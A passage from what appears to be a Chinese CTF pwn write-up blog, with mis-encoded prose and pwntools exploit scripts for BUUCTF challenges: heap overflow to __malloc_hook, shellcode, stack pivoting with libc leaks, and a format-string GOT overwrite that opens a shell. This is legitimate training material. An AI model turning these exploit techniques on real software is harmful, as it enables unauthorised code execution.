class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29536</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br> sla(<span class="hljs-string">&#x27;content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-----------------------------------------</span><br>create(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#0</span><br>create(<span class="hljs-number">0x30</span>)<span class="hljs-comment">#1</span><br>create(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#2</span><br>create(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0xD1</span>))<br>delete(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0xc0</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x40</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x91</span>))<br>delete(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#----------------------------------------</span><br>main_arena=<span class="hljs-number">0x3C4B20</span><br>ru(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>rc(<span class="hljs-number">0x40</span>)<br>addr=u64(rc(<span class="hljs-number">8</span>))<br>base=addr-<span class="hljs-number">88</span>-main_arena<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br><span class="hljs-comment">#print hex(addr)</span><br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x80</span>)<br>hook=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>shell=base+o_g_old[<span class="hljs-number">1</span>]<br><span class="hljs-comment">#---------------------------------------</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0xb0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x71</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">13</span>+p64(<span class="hljs-number">0x21</span>))<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x50</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x71</span>)+p64(hook-<span class="hljs-number">0x23</span>)*<span class="hljs-number">2</span>)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#2</span><br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#4</span><br><span class="hljs-comment">#debug()</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x13</span>+<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x13</span>-<span class="hljs-number">8</span>)+p64(shell)+p64(base+libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]+<span class="hljs-number">14</span>))<br>create(<span class="hljs-number">0x10</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="mrctf2020-shellcode">mrctf2020_shellcode</h3><p>NXæ²¡å¼€ï¼Œçœ‹ä¸äº†æ±‡ç¼–ï¼Œä½†ç›´æ¥shellcodeå°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26373</span>)<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>sc=asm(shellcraft.sh())<br>r.sendline(sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="gyctf-2020-borrowstack">gyctf_2020_borrowstack</h3><p><strong>å…³é”®è¯</strong>ï¼šæ ˆè¿ç§»</p><p>ä½¿ç”¨å¯æ§åˆ¶çš„åœ°å€è¦†ç›–ebpçš„å€¼ï¼Œä½¿ç”¨leave;retæŒ‡ä»¤æ‰€åœ¨åœ°å€è¦†ç›–retçš„å€¼ï¼Œè¿ç§»åè¦å¡«å……4æˆ–8</p><p>readçš„æ—¶å€™ç”¨send</p><p>è¿™é¢˜é¦–å…ˆæ³¨æ„ï¼š</p><p>1.bssæ®µç¦»pltï¼Œgotå¾ˆè¿‘ï¼Œè¦é€‚å½“æŠ¬é«˜è¿ç§»çš„ä½ç½®</p><p>3.ç”¨systemæ‹¿,ä¼°è®¡è¿˜å¾—è¦æ ˆè¿ç§»ï¼Œéº»çƒ¦ï¼Œç”¨ogç®€å•ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26005</span>)<br><span class="hljs-comment">#r=process(&#x27;./gyctf_2020_borrowstack&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./gyctf_2020_borrowstack&#x27;</span>)<br>pop_rdi=<span class="hljs-number">0x400703</span><br>leave_ret=<span class="hljs-number">0x400699</span><br>ret=<span class="hljs-number">0x004004c9</span><br>bank=<span class="hljs-number">0x601080</span><br>r.recvuntil(<span class="hljs-string">&#x27;me what you want&#x27;</span>)<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(bank+<span class="hljs-number">0xa0</span>)+p64(leave_ret))<br>r.recvuntil( <span class="hljs-string">&#x27;borrow stack now!&#x27;</span>)<br>r.send(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0x14</span>+p64(<span class="hljs-number">0</span>)+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]))<br>r.recvline()<br>puts=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br>base=puts-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>og = [<span class="hljs-number">0x45216</span>, <span class="hljs-number">0x4526a</span>, <span class="hljs-number">0xf02a4</span>, <span class="hljs-number">0xf1147</span>]<br>one_gadget=base+og[<span class="hljs-number">1</span>]<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+p64(one_gadget))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="lonelywolf">lonelywolf</h3><p>ä»¥åé‡åˆ°é¢˜ç›®å¯ä»¥å…ˆçœ‹çœ‹libcç‰ˆæœ¬ï¼Œä¸ä¸€æ ·çš„éœ€è¦æ”¹é“¾æ¥</p><p>strings libcçš„åå­— | grep LIBC</p><p>å¯ä»¥æŸ¥çœ‹libcç‰ˆæœ¬</p><p>è¿™é¢˜æˆ‘çš„ç‰ˆæœ¬ä¸å›½èµ›libcé“¾æ¥ç‰ˆæœ¬ä¸ä¸€æ ·ï¼Œéœ€è¦æ”¹åº“é“¾æ¥</p><p>lddæŸ¥çœ‹elfçš„ldå’Œlibc</p><p>patchelf --set-interpreter ï¼ˆï¼‰-â€“set-rpath ï¼ˆï¼‰ï¼ˆï¼‰</p><p>ä¸¤ä¸ªå‚æ•°è¦æ¢æˆè‡ªå·±æœ¬åœ°å¯¹åº”çš„è·¯å¾„ï¼Œ</p><p>â€“set-interpreter åé¢è·Ÿçš„æ˜¯ld.soçš„è·¯å¾„ï¼Œ</p><p>â€“set-rpath åé¢è·Ÿçš„æ˜¯æ–‡ä»¶å¤¹è·¯å¾„ï¼Œ</p><p>æœ€ååŠ ä¸Šä½ æƒ³è¦æ›´æ¢glibcç‰ˆæœ¬çš„ç¨‹åºåç§°</p><p>ä¸€æ¬¡å¤±è´¥çš„å¤ç°</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import *<br>local_file  = <span class="hljs-string">&#x27;./lonelywolf&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = <span class="hljs-variable constant_">ELF</span>(local_libc)<br><span class="hljs-symbol">else:</span><br>    r = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>    libc = <span class="hljs-variable constant_">ELF</span>(remote_libc)<br><br>elf = <span class="hljs-variable constant_">ELF</span>(local_file)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:r</span>.send(data)<br>sa      = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:r</span>.sendafter(delim, data)<br>sl      = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:r</span>.sendline(data)<br>sla     = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:r</span>.sendlineafter(delim, data)<br>sea     = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:r</span>.sendafter(delim, data)<br>rc      = <span class="hljs-built_in">lambda</span> numb=<span class="hljs-number">4096</span>          <span class="hljs-symbol">:r</span>.recv(numb)<br>rl      = <span class="hljs-built_in">lambda</span>                    <span class="hljs-symbol">:r</span>.recvline()<br>ru      = <span class="hljs-built_in">lambda</span> delims                         <span class="hljs-symbol">:r</span>.recvuntil(delims)<br>uu32    = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:u32</span>(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:u64</span>(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-built_in">lambda</span> tag, addr        <span class="hljs-symbol">:r</span>.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.format(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allocate</span>(<span class="hljs-params">size</span>):<br> sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,str(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,text</span>):<br> sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,str(index))<br> sla(<span class="hljs-string">&#x27;Content: &#x27;</span>,str(text))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,str(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,str(index))<br><span class="hljs-comment">#---------------------------------------------------------------</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;by pass check&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>heap=uu64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-symbol">:-</span><span class="hljs-number">1</span>])<br>print hex(heap)<br><span class="hljs-comment">#--------------------------------------------------------------</span><br>head=heap-<span class="hljs-number">0x250</span><br>allocate(<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0</span>,p64(head))<br>allocate(<span class="hljs-number">0x10</span>)<br>allocate(<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\xff&#x27;</span>*<span class="hljs-number">0x23</span>+<span class="hljs-string">&#x27;\xff&#x27;</span>)<br><span class="hljs-comment">#delete(0)</span><br><span class="hljs-comment">#show(0)</span><br><span class="hljs-comment">#-------------------------------------------------------------</span><br><span class="hljs-comment">#allocate(0x80)</span><br><span class="hljs-comment">#delete(1)</span><br>debug()<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="axb-2019-fmt32">axb_2019_fmt32</h3><p><strong>å…³é”®è¯</strong>ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p><strong>æ€è·¯</strong>ï¼š</p><p>è¿™é¢˜è‡ªå¸¦å¾ªç¯ï¼Œæ²¡æœ‰æ ˆæº¢å‡ºçš„åœ°æ–¹ï¼Œè€Œä¸”gotè¡¨å¯å†™</p><p>è¿›è¡Œä¸¤æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨ï¼Œå’Œä¸€æ¬¡å¡«å†™</p><p>1.ç¬¬ä¸€æ¬¡é€ æˆä»»æ„è¯»ï¼Œæ³„éœ²putsçš„gotè¡¨ï¼Œè¿›è€Œæ³„éœ²libc</p><p>2.ç¬¬äºŒæ¬¡é€ æˆä»»æ„å†™ï¼ŒæŠŠstrlençš„gotè¡¨æ”¹ä¸ºsystem</p><p>3.ç¬¬ä¸‰æ¬¡å†™å…¥;/bin/sh,å°±èƒ½å¼€shell</p><p><strong>æ³¨æ„ç‚¹</strong>ï¼š</p><p>1.è¿™é¢˜alarmä¸º3ç§’ï¼Œä¸ºæ–¹ä¾¿åˆ†æï¼Œå…ˆä½¿å…¶å¤±æ•ˆ</p><p><a href="https://blog.csdn.net/A951860555/article/details/111214951">ctf - pwné¢˜ä¹‹alarmå‡½æ•°_lifanxinçš„åšå®¢-CSDNåšå®¢</a>æœ‰ä¸‰ç§æ–¹æ³•</p><p>æˆ‘ç”¨å…¶ä¸­ä¸€ç§ï¼Œç”¨vimæ‰“å¼€æ–‡ä»¶</p><p>æ‰“å¼€åç›´æ¥è¾“å…¥/alarmè¿›è¡Œæœç´¢</p><p>æ‰¾åˆ°åå›è½¦ï¼ŒæŒ‰ä¸‹iè¿›è¡Œç¼–è¾‘ï¼Œæ›´æ”¹ä¸ºisnan</p><p>2.å¤šæ¬¡è¿è¡Œç¨‹åºè°ƒè¯•æµ‹å®šåç§»ï¼ˆåŒ…æ‹¬ç¬¬äºŒæ¬¡ï¼‰</p><p>3.ç¬¬äºŒæ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨ä¸­ï¼Œä¸èƒ½ä¸€æ¬¡å†™è¿›4å­—åœ°å€ï¼Œåˆ†ä¸¤æ¬¡ï¼Œstrlenåœ°å€çš„å‰åé¡ºåºç”±å¤§å°å†³å®š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27679</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf=ELF(<span class="hljs-string">&#x27;./axb_2019_fmt32&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>+p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+<span class="hljs-string">&#x27;%8$s&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>)<br>r.recv(<span class="hljs-number">5</span>)<br>got=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(got)<br>base=got-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>sys=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#--------------------------------</span><br>strlen=elf.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]<br>high_sys=(sys&gt;&gt;<span class="hljs-number">16</span>)<br>low_sys=sys&amp;<span class="hljs-number">0xffff</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(sys)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(high_sys)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(low_sys)<br>r.recvuntil(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br><span class="hljs-comment">#payload=&#x27;p&#x27;+&#x27;%&#x27;+str(low_sys-10)+&#x27;c%15$hn&#x27;+&#x27;%&#x27;+str(high_sys-low_sys)+&#x27;c%16$hn&#x27;+&#x27;pp&#x27;</span><br><span class="hljs-comment">#print len(payload)</span><br><span class="hljs-comment">#r.sendline(payload+p32(strlen)+p32(strlen+2))</span><br>pad=<span class="hljs-string">&#x27;a&#x27;</span>+fmtstr_payload(<span class="hljs-number">8</span>,&#123;elf.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]:sys&#125;,write_size = <span class="hljs-string">&quot;byte&quot;</span>,numbwritten = <span class="hljs-number">0xa</span>)<br>r.sendline(pad)<br><span class="hljs-comment">#-------------------------------</span><br>r.recvuntil(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;;/bin/sh&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>å°ç»“ï¼šå¿˜å…‰å…‰ï¼Œåšçš„æ—¶å€™èŠ±äº†å¾ˆä¹…ï¼Œ%ncè¾“å…¥nä¸ªæ•°ï¼Œè®¡ç®—å­—ç¬¦æ•°åˆ°$ï¼ˆä¸åŒ…æ‹¬ï¼‰,ç¬¬äºŒæ¬¡åˆ©ç”¨æ ¼å¼å‡ºå­—ç¬¦ä¸²çš„â€˜aâ€™æ˜¯ä¸ºäº†å¯¹é½ï¼Ÿ</p><p>pwntoolså·¥å…·FmtStråˆ©ç”¨ï¼š</p><p>å¼•ç”¨è¿™ä½å¸ˆå‚…æ–‡ç« <a href="https://blog.csdn.net/A951860555/article/details/115061803?spm=1001.2014.3001.5502">pwntools FmtStræ ¼å¼åŒ–å­—ç¬¦ä¸²ç±»ä½¿ç”¨è¯¦è§£_lifanxinçš„åšå®¢-CSDNåšå®¢</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">64</span>ä½æ ¼å¼åŒ–æ¼æ´è¦è®¾ç½®ä¸€ä¸‹ä¸Šä¸‹æ–‡ç¯å¢ƒ<br>context<span class="hljs-selector-class">.arch</span> = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-function"><span class="hljs-title">fmtstr_payload</span><span class="hljs-params">(offset, writes, numbwritten=<span class="hljs-number">0</span>, write_size=<span class="hljs-string">&quot;byte&quot;</span>)</span></span><br>æ€»å…±å››ä¸ªå‚æ•°ï¼š<br>offset --&gt; åç§»é‡ <br>writes --&gt; &#123;è¢«è¦†ç›–çš„åœ°å€:è¦å†™å…¥çš„åœ°å€&#125; åœ°å€éƒ½ä¸ºintå‹ï¼Œä¹Ÿå°±æ˜¯ä¸éœ€è¦ä½¿ç”¨p32æˆ–è€…p64æ‰“åŒ…<br>numbwritten --&gt; å·²ç»ç”±printfå‡½æ•°å†™å…¥çš„å­—èŠ‚æ•°ï¼Œé»˜è®¤ä¸º<span class="hljs-number">0</span><br>write_size --&gt; é€byte/short/intå†™å…¥ï¼Œé»˜è®¤æ˜¯byteï¼Œè¿™æ ·å‘é€çš„å­—èŠ‚å°‘<br>pro = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>printf_got = pro<span class="hljs-selector-class">.got</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;printf&quot;</span>]</span><br>system_plt = pro<span class="hljs-selector-class">.plt</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;system&quot;</span>]</span><br>pad = <span class="hljs-built_in">fmtstr_payload</span>(offset, &#123;printf_got:system_plt&#125;)<br><span 